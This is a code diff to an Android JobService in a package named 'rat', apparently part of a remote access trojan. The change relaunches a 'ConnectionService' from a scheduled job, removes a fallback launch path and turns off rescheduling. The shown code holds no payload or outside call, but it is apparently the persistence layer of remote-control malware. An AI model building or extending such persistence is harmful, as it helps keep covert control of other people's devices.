@@ -1,5 +1,7 @@
 package com.fly0rakoon.rat.services;
 
+
+
 import android.app.job.JobParameters;
 import android.app.job.JobService;
 import android.content.Intent;
@@ -11,38 +13,24 @@ public class JobSchedulerService extends JobService {
 
     @Override
     public boolean onStartJob(JobParameters params) {
-        Log.d(TAG, "Job started, launching ForegroundService");
-        
+        Log.d(TAG, "Job started, launching ConnectionService");
+
         try {
-            Intent serviceIntent = new Intent(this, ForegroundService.class);
+            Intent serviceIntent = new Intent(this, ConnectionService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
                 startService(serviceIntent);
             }
-            Log.d(TAG, "Service started successfully from job");
         } catch (Exception e) {
-            Log.e(TAG, "Failed to start service from job: " + e.getMessage());
-            
-            // Try alternative method
-            try {
-                Intent altIntent = new Intent(this, ConnectionManager.class);
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(altIntent);
-                } else {
-                    startService(altIntent);
-                }
-            } catch (Exception ex) {
-                Log.e(TAG, "Alternative start also failed: " + ex.getMessage());
-            }
+            Log.e(TAG, "Failed to start service from job", e);
         }
-        
-        return false; // Work completed
+
+        return false; // Work is not continuing on a separate thread
     }
 
     @Override
     public boolean onStopJob(JobParameters params) {
-        Log.d(TAG, "Job stopped, will reschedule");
-        return true; // Reschedule if stopped
+        return false; // Don't reschedule if stopped
     }
 }
